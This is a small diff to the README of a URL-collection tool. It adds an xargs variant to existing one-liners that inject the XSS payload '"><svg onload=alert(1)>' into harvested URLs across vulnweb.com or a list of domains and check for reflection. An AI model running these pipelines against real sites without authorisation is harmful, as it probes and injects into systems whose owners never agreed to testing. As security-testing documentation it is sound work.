@@ -57,6 +57,9 @@ bau vulnweb.com -s "php|js|svg|png" | urldedupe -qs | uro | qsreplace '"><svg on
 
 # XSS Hunting on multiple domains w/ HTTPx (Probbing & slower)
 bau $(cat domains.txt) -s "php|js|svg|png" | httpx -silent -mc 200 | qsreplace '"><svg onload=alert(1)>' | airixss -payload "alert(1)"
+
+# With XARGS
+echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -s "php|js|svg|png"' | ...
 ```
 
 <br>
